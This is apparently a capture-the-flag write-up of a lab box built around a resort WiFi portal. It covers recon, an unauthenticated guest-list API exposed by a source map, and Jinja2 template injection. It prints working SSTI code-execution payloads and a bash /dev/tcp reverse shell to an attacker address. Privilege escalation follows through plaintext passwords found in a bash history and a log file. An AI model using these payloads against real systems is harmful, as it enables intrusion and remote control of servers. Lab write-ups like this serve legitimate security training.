# HackSmarterLabs - Casino | Writeup

**Target:** Hack Smarter World Resort (Guest WiFi Captive Portal)
**Objective:** Gain initial access via the captive portal and escalate to root.

---

## 1. Recon

Started with a full TCP port scan against the provided IP.

```
└─$ nmap -Pn -sS -sV -sC -A -T4 -p- 10.1.23.248   
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Werkzeug httpd 3.1.8 (Python 3.10.18)
|_http-server-header: Werkzeug/3.1.8 Python/3.10.18
| http-title: Hack Smarter World - Guest WiFi & Portal
|_Requested resource was /login
2222/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u7 (protocol 2.0)
```

Three interesting ports: a real host SSH on 22, a **second SSH service on 2222** (likely a container/nested host), and a Flask/Werkzeug app on 80 serving a guest WiFi captive portal.

Directory brute-forced the web app:

```
└─$ gobuster dir -u http://10.1.23.248 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/login                (Status: 200) [Size: 4778]
/profile              (Status: 302) [Size: 199] [--> /login]
/logout               (Status: 302) [Size: 199] [--> /login]
/dashboard            (Status: 302) [Size: 199] [--> /login]
```

`/profile`, `/logout`, and `/dashboard` all redirect to `/login` when unauthenticated, confirming session-gated routes worth revisiting once I had valid creds.

## 2. Finding a way in — leaking a guest identity

The login page (`/login`) only asks for a **room number** and **guest last name** — no password. That screams "the app trusts a lookup against some backend list of reservations," so the goal became finding that list.

Viewing the page source showed it pulling a minified JS bundle:

```html
<script> src="/static/js/app.min.js"></script>
```

`app.min.js` itself was tiny and unhelpful, but it referenced a source map:

```js
function initPortal(){console.log("Hack Smarter World WiFi Gateway Active");}document.addEventListener("DOMContentLoaded",initPortal);
//# sourceMappingURL=app.min.js.map
```

Pulling `app.min.js.map` exposed the original, un-minified source in `sourcesContent`:

```json
{
  "version": 3,
  "file": "app.min.js",
  "sources": ["src/api/roomVerification.js"],
  "sourcesContent": [
    "// Front-Desk Kiosk API verification helper\nasync function checkRoomStatus(roomNum) {\n const res = await fetch('/api/v1/rooms/status?status=occupied');\n return await res.json();\n}"
  ]
}
```

That revealed an **unauthenticated API endpoint** meant only for the front-desk kiosk: `/api/v1/rooms/status?status=occupied`. Hitting it directly dumped the entire occupied-room guest list — room numbers, first/last names, checkout dates, and membership tier, with no auth required.

Grabbed a valid identity from the JSON (Room 283, "Baker") and logged into the portal with it — straight in, no password needed since the app only checks room + last name.

## 3. SSTI on `/profile`

Once authenticated as guest **Patricia Baker (Room 283)**, the dashboard showed the usual resort guest amenities. The `/profile` page let you set a "Preferred Display Name / Nickname" that gets reflected back on the page ("Welcome Back, `<name>`!").

Reflected user input that gets echoed back into a Flask app is always worth a quick SSTI check:

```
Preferred Display Name / Nickname: {{7*7}}
```

Result:

```
Welcome Back, 49!
```

Confirmed **Server-Side Template Injection** via Flask/Jinja2's `render_template_string`.

## 4. From SSTI to RCE

With Jinja2 SSTI confirmed, escalated to arbitrary code execution using the classic `__init__`/`__globals__` sandbox-escape chain:

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls /home').read() }}
```

This confirmed OS command execution and revealed two users on the box: `david` and `george`.

Used the same primitive to read the user flag directly through the web response, no shell needed:

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /home/george/user.txt').read() }}
```

Grabbed the **user flag** this way straight from the browser.

## 5. Getting a real shell

Set up a listener and used the SSTI RCE primitive to trigger a reverse shell:

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen("bash -c 'bash -i >& /dev/tcp/10.200.85.243/4444 0>&1'").read() }}
```

Caught it on the attacker box:

```
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.200.85.243] from (UNKNOWN) [10.1.23.248] 36756
bash: cannot set terminal process group (66): Inappropriate ioctl for device
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
www-data@6875a9605450:/app/app$
```

Landed as `www-data`. Upgraded to a proper TTY:

```
www-data@6875a9605450:/app/app$ python -c 'import pty;pty.spawn("/bin/bash")'
```

```
www-data@6875a9605450:/app/app$ ls
__pycache__
app.py
database.py
resort.db
static
templates
```

`app.py` confirmed the vuln — `/profile` builds its HTML with `render_template_string(dynamic_template)` where `dynamic_template` is an f-string containing the raw, unsanitized `display_name` from the session — textbook SSTI:

```python
dynamic_template = f"""
...
<h5 class="alert-heading fw-bold">...Welcome Back, {display_name}!</h5>
...
<input ... value="{display_name}" required>
...
"""
return render_template_string(dynamic_template)
```

## 6. Privilege Escalation — www-data → george → david

Checked `/home` and found a `george` home directory with an accessible bash history:

```
www-data@6875a9605450:/home/george$ cat .bash_history
cd /var/www/app
ls -la
systemctl status gunicorn
python3 -m pip install -r requirements.txt
tail -f /var/log/syslog
cat /etc/netplan/01-netcfg.yaml
uptime
htop
ifconfig
netstat -tulpn
cd /etc/ssh/
cat sshd_config | grep -v '^#'
cd /home/george
ls -la
ssh-keygen -t rsa -b 2048
cat .ssh/id_rsa.pub >> .ssh/authorized_keys
chmod 644 .ssh/id_rsa
sudo systemctl restart ssh
w
whoami
df -h
free -m
su david
DavidPass2026!#
exit
history -c
mysql -u david -p'DavidPass2026!#' -h 127.0.0.1 resort_db
cd /opt/
ls -la
cat /var/log/provisioning.log
echo "Restarting service..."
python3 app.py
ps aux | grep python
curl http://127.0.0.1/api/v1/rooms/status
curl http://127.0.0.1/login
clear
date
ping -c 4 8.8.8.8
dig hacksmarter.sec
cat /etc/hosts
sudo ufw status
traceroute 10.40.0.1
cd ~
ls -la
```

George's own history leaked David's password in plaintext (`DavidPass2026!#`), along with a hint that David's account has DB and `/var/log` access worth chasing.

```
www-data@6875a9605450:/app/app$ su david
Password: DavidPass2026!#

david@6875a9605450:/app/app$ 
```

## 7. david → root

As `david`, checked `id` and group membership, then went straight for `/var/log` since the leaked history explicitly referenced `provisioning.log`:

```
david@6875a9605450:~$ id
uid=1001(david) gid=1001(david) groups=1001(david),4(adm)
```

`adm` group membership explains the log read access. Pulled the provisioning log:

```
david@6875a9605450:/var/log$ cat provisioning.log 
2026-08-01 03:14:02 [INFO] Starting automated cluster provisioning for Hack Smarter World host node...
2026-08-01 03:14:15 [INFO] Configuring network interfaces eth0 (VLAN 402)...
2026-08-01 03:14:22 [INFO] Initializing MariaDB production instance...
2026-08-01 03:14:28 [INFO] Seeding resort guest database tables...
2026-08-01 03:14:30 [SUCCESS] Applied security policy for root access.
2026-08-01 03:14:31 [DEBUG] Saved system root sync credential: R3s0rt_Sup3r_S3cr3t_R00t_2026!
2026-08-01 03:14:35 [INFO] Generating SSH host key certificates...
2026-08-01 03:14:45 [INFO] Deployment completed successfully.
```

An automated provisioning script had debug-logged the **root password** in plaintext. Used it directly:

```
david@6875a9605450:/var/log$ su root
Password: 
root@6875a9605450:/var/log# cd /root
root@6875a9605450:~# ls
root.txt
root@6875a9605450:~# cat root.txt 
```

Grabbed the **root flag** this way.

**Root.**

---



Flags:
- **User:** `/home/george/user.txt` (read directly via SSTI RCE)
- **Root:** `/root/root.txt` (read after full privilege escalation chain)
